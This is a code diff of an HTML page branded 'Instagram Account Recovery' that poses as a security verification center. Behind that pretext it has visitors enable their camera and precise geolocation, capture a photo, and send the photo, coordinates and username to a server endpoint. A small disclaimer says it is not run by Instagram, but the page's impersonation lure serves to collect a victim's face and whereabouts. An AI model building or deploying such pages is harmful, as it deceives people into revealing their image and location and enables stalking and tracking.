@@ -1,105 +1,618 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Instagram Account Recovery</title>
-  <style>
-    *{box-sizing:border-box}
-    body{
-      margin:0;
-      min-height:100vh;
-      background:#050505;
-      color:#00ff88;
-      font-family:monospace;
-      display:flex;
-      justify-content:center;
-      align-items:center;
-      padding:20px;
-    }
-    .box{
-      width:100%;
-      max-width:430px;
-      border:1px solid #00ff88;
-      padding:25px;
-      background:#090d0b;
-      box-shadow:0 0 25px #00ff8833;
-      text-align:center;
-    }
-    h1{
-      color:#ff315c;
-      font-size:25px;
-      margin-bottom:8px;
-    }
-    .tag{
-      color:#00ff88;
-      margin-bottom:25px;
-    }
-    input{
-      width:100%;
-      padding:14px;
-      background:#000;
-      color:#00ff88;
-      border:1px solid #00ff88;
-      outline:none;
-      margin-bottom:15px;
-      font-family:monospace;
-    }
-    button{
-      width:100%;
-      padding:14px;
-      background:#00ff88;
-      color:#000;
-      border:0;
-      font-weight:bold;
-      cursor:pointer;
-    }
-    #status{
-      margin-top:20px;
-      min-height:50px;
-      color:#00ff88;
-      line-height:1.6;
-    }
-    .small{
-      margin-top:20px;
-      font-size:11px;
-      color:#777;
-    }
-  </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title>Instagram Account Recovery</title>
+
+<style>
+*{box-sizing:border-box}
+
+body{
+  margin:0;
+  min-height:100vh;
+  background:#030504;
+  color:#00ff66;
+  font-family:monospace;
+  display:flex;
+  justify-content:center;
+  align-items:center;
+  padding:18px;
+}
+
+.box{
+  width:100%;
+  max-width:460px;
+  border:1px solid #00ff66;
+  background:#071009;
+  padding:22px;
+  box-shadow:0 0 30px #00ff6633;
+}
+
+h1{
+  text-align:center;
+  color:#ff315c;
+  font-size:24px;
+  margin:0 0 8px;
+  text-shadow:0 0 12px #ff315c;
+}
+
+.subtitle{
+  text-align:center;
+  color:#00ff66;
+  margin-bottom:20px;
+}
+
+.notice{
+  color:#aaa;
+  font-size:12px;
+  line-height:1.5;
+  border:1px solid #333;
+  padding:10px;
+  margin-bottom:15px;
+}
+
+input,button{
+  width:100%;
+  padding:13px;
+  margin-top:10px;
+  font-family:monospace;
+  font-size:15px;
+}
+
+input{
+  background:#000;
+  color:#00ff66;
+  border:1px solid #00ff66;
+  outline:none;
+}
+
+button{
+  background:#00ff66;
+  color:#000;
+  border:0;
+  font-weight:bold;
+  cursor:pointer;
+}
+
+button:hover{
+  box-shadow:0 0 15px #00ff66;
+}
+
+.secondary{
+  background:#001a0a;
+  color:#00ff66;
+  border:1px solid #00ff66;
+}
+
+.card{
+  margin-top:18px;
+  padding:15px;
+  border:1px solid #174d2b;
+  background:#020602;
+}
+
+.profile{
+  display:flex;
+  align-items:center;
+  gap:12px;
+  margin-bottom:10px;
+}
+
+.avatar{
+  width:55px;
+  height:55px;
+  border-radius:50%;
+  border:1px solid #00ff66;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  font-size:25px;
+}
+
+.username{
+  font-size:18px;
+  color:#fff;
+}
+
+video,img{
+  width:100%;
+  margin-top:12px;
+  border:1px solid #00ff66;
+}
+
+.status{
+  margin-top:12px;
+  color:#00ff66;
+  white-space:pre-wrap;
+  line-height:1.5;
+}
+
+.small{
+  color:#777;
+  font-size:11px;
+  margin-top:15px;
+  line-height:1.5;
+}
+
+.hidden{
+  display:none;
+}
+</style>
 </head>
 
 <body>
-  <div class="box">
-    <h1>INSTAGRAM ACCOUNT RECOVERY</h1>
-    <div class="tag">⚡ ARSALAN CYBER SECURITY ⚡</div>
 
-    <input id="username" type="text"
-      placeholder="Enter your username">
+<div class="box">
 
-    <button onclick="recover()">VERIFY ACCOUNT</button>
+<h1>INSTAGRAM ACCOUNT RECOVERY</h1>
 
-    <div id="status"></div>
+<div class="subtitle">
+[ SECURITY VERIFICATION CENTER ]
+</div>
 
-    <div class="small">
-      Account recovery interface • Do not enter passwords or private credentials
+<div class="notice">
+This is an independent demo/recovery interface and is not operated by Instagram.
+Camera and location are optional and are used only after your permission.
+Nothing is automatically uploaded.
+</div>
+
+<input
+  id="username"
+  type="text"
+  placeholder="Enter Instagram username"
+  autocomplete="off"
+>
+
+<button id="searchBtn">
+🔎 SEARCH ACCOUNT
+</button>
+
+<div id="profileCard" class="card hidden">
+
+  <div class="profile">
+    <div class="avatar">👤</div>
+
+    <div>
+      <div class="username" id="displayUsername"></div>
+      <div style="color:#777;font-size:12px">
+        Public profile shortcut
+      </div>
     </div>
   </div>
 
-  <script>
-    function recover(){
-      const user = document.getElementById("username").value.trim();
-      const status = document.getElementById("status");
+  <button id="profileBtn" class="secondary">
+    🔗 OPEN INSTAGRAM PROFILE
+  </button>
 
-      if(!user){
-        status.textContent = "[!] Enter a username first.";
-        return;
+  <button id="verifyBtn">
+    ⚡ START VERIFICATION
+  </button>
+
+</div>
+
+<div id="verification" class="card hidden">
+
+  <div class="status" id="status">
+    Verification started.
+  </div>
+
+  <button id="cameraBtn">
+    📷 ALLOW CAMERA
+  </button>
+
+  <video id="video" autoplay playsinline class="hidden"></video>
+
+  <button id="takePhotoBtn" class="hidden">
+    📸 TAKE PHOTO
+  </button>
+
+  <img id="photoPreview" class="hidden" alt="Photo preview">
+
+  <button id="sendPhotoBtn" class="secondary hidden">
+    📤 SEND PHOTO
+  </button>
+
+  <hr style="border-color:#17351f;margin-top:20px">
+
+  <button id="locationBtn">
+    📍 ALLOW LOCATION
+  </button>
+
+  <div id="locationText" class="status"></div>
+
+  <button id="sendLocationBtn" class="secondary hidden">
+    📤 SEND LOCATION
+  </button>
+
+</div>
+
+<div class="small">
+By continuing, you choose what information to share.
+Do not enter passwords, OTPs, recovery codes, or other sensitive credentials.
+</div>
+
+</div>
+
+<script>
+
+const usernameInput =
+  document.getElementById("username");
+
+const searchBtn =
+  document.getElementById("searchBtn");
+
+const profileCard =
+  document.getElementById("profileCard");
+
+const displayUsername =
+  document.getElementById("displayUsername");
+
+const profileBtn =
+  document.getElementById("profileBtn");
+
+const verifyBtn =
+  document.getElementById("verifyBtn");
+
+const verification =
+  document.getElementById("verification");
+
+const status =
+  document.getElementById("status");
+
+const cameraBtn =
+  document.getElementById("cameraBtn");
+
+const video =
+  document.getElementById("video");
+
+const takePhotoBtn =
+  document.getElementById("takePhotoBtn");
+
+const photoPreview =
+  document.getElementById("photoPreview");
+
+const sendPhotoBtn =
+  document.getElementById("sendPhotoBtn");
+
+const locationBtn =
+  document.getElementById("locationBtn");
+
+const locationText =
+  document.getElementById("locationText");
+
+const sendLocationBtn =
+  document.getElementById("sendLocationBtn");
+
+let stream = null;
+let photoBlob = null;
+let locationData = null;
+let currentUsername = "";
+
+
+/* SEARCH ACCOUNT */
+
+searchBtn.addEventListener("click", () => {
+
+  const username =
+    usernameInput.value.trim().replace(/^@/, "");
+
+  if(!username){
+    alert("Please enter a username.");
+    return;
+  }
+
+  currentUsername = username;
+
+  displayUsername.textContent =
+    "@" + username;
+
+  profileCard.classList.remove("hidden");
+
+});
+
+
+/* OPEN PUBLIC PROFILE */
+
+profileBtn.addEventListener("click", () => {
+
+  const url =
+    "https://www.instagram.com/" +
+    encodeURIComponent(currentUsername) +
+    "/";
+
+  window.open(url, "_blank");
+
+});
+
+
+/* START VERIFICATION */
+
+verifyBtn.addEventListener("click", () => {
+
+  verification.classList.remove("hidden");
+
+  status.textContent =
+    "Verification started.\n" +
+    "Choose the information you want to share.";
+
+});
+
+
+/* CAMERA PERMISSION */
+
+cameraBtn.addEventListener("click", async () => {
+
+  try{
+
+    stream =
+      await navigator.mediaDevices.getUserMedia({
+        video:true,
+        audio:false
+      });
+
+    video.srcObject = stream;
+
+    video.classList.remove("hidden");
+
+    takePhotoBtn.classList.remove("hidden");
+
+    status.textContent =
+      "Camera enabled.\n" +
+      "Tap TAKE PHOTO when ready.";
+
+  }catch(error){
+
+    status.textContent =
+      "Camera permission was not granted.";
+
+  }
+
+});
+
+
+/* TAKE PHOTO */
+
+takePhotoBtn.addEventListener("click", () => {
+
+  const canvas =
+    document.createElement("canvas");
+
+  canvas.width =
+    video.videoWidth;
+
+  canvas.height =
+    video.videoHeight;
+
+  const ctx =
+    canvas.getContext("2d");
+
+  ctx.drawImage(
+    video,
+    0,
+    0,
+    canvas.width,
+    canvas.height
+  );
+
+  canvas.toBlob(blob => {
+
+    photoBlob = blob;
+
+    photoPreview.src =
+      URL.createObjectURL(blob);
+
+    photoPreview.classList.remove("hidden");
+
+    sendPhotoBtn.classList.remove("hidden");
+
+    status.textContent =
+      "Photo captured.\n" +
+      "Review it before sending.";
+
+    if(stream){
+
+      stream
+        .getTracks()
+        .forEach(track => track.stop());
+
+    }
+
+  },"image/jpeg",0.75);
+
+});
+
+
+/* SEND PHOTO */
+
+sendPhotoBtn.addEventListener("click", async () => {
+
+  if(!photoBlob){
+
+    status.textContent =
+      "No photo selected.";
+
+    return;
+  }
+
+  status.textContent =
+    "Sending photo...";
+
+  try{
+
+    const reader =
+      new FileReader();
+
+    reader.onloadend = async () => {
+
+      const base64 =
+        reader.result.split(",")[1];
+
+      const response =
+        await fetch("/api/send",{
+
+          method:"POST",
+
+          headers:{
+            "Content-Type":"application/json"
+          },
+
+          body:JSON.stringify({
+
+            type:"photo",
+            username:currentUsername,
+            photoBase64:base64
+
+          })
+
+        });
+
+      if(response.ok){
+
+        status.textContent =
+          "Photo sent successfully.";
+
+      }else{
+
+        status.textContent =
+          "Photo sending service is not connected yet.";
+
       }
 
-      status.innerHTML =
-        "[+] USER: @" + user +
-        "<br>[+] VERIFYING ACCOUNT...<br>" +
-        "[+] RECOVERY PROCESS STARTED...";
+    };
+
+    reader.readAsDataURL(photoBlob);
+
+  }catch(error){
+
+    status.textContent =
+      "Could not send photo.";
+
+  }
+
+});
+
+
+/* LOCATION PERMISSION */
+
+locationBtn.addEventListener("click", () => {
+
+  if(!navigator.geolocation){
+
+    locationText.textContent =
+      "Location is not supported by this browser.";
+
+    return;
+  }
+
+  locationText.textContent =
+    "Requesting location permission...";
+
+  navigator.geolocation.getCurrentPosition(
+
+    position => {
+
+      locationData = {
+
+        latitude:
+          position.coords.latitude,
+
+        longitude:
+          position.coords.longitude
+
+      };
+
+      locationText.textContent =
+        "Location received.\n" +
+        "Latitude: " +
+        locationData.latitude +
+        "\nLongitude: " +
+        locationData.longitude;
+
+      sendLocationBtn.classList.remove("hidden");
+
+    },
+
+    () => {
+
+      locationText.textContent =
+        "Location permission was not granted.";
+
+    },
+
+    {
+
+      enableHighAccuracy:true,
+      timeout:10000,
+      maximumAge:0
+
     }
-  </script>
+
+  );
+
+});
+
+
+/* SEND LOCATION */
+
+sendLocationBtn.addEventListener("click", async () => {
+
+  if(!locationData){
+
+    locationText.textContent =
+      "No location selected.";
+
+    return;
+  }
+
+  locationText.textContent =
+    "Sending location...";
+
+  try{
+
+    const response =
+      await fetch("/api/send",{
+
+        method:"POST",
+
+        headers:{
+          "Content-Type":"application/json"
+        },
+
+        body:JSON.stringify({
+
+          type:"location",
+          username:currentUsername,
+          latitude:locationData.latitude,
+          longitude:locationData.longitude
+
+        })
+
+      });
+
+    if(response.ok){
+
+      locationText.textContent =
+        "Location sent successfully.";
+
+    }else{
+
+      locationText.textContent =
+        "Location sending service is not connected yet.";
+
+    }
+
+  }catch(error){
+
+    locationText.textContent =
+      "Could not send location.";
+
+  }
+
+});
+
+</script>
+
 </body>
 </html>
